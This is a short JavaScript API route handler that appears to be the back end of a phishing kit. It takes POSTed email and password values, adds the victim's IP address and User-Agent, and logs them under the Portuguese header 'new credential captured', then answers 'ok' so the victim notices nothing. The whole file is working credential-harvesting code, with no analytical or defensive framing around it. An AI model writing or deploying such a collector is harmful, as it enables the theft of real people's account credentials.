export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { email, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'];

  console.log('[+] Nova credencial capturada:');
  console.log(`Email: ${email}`);
  console.log(`Senha: ${password}`);
  console.log(`IP: ${ip}`);
  console.log(`User-Agent: ${ua}`);

  return res.status(200).json({ message: 'ok' });
}
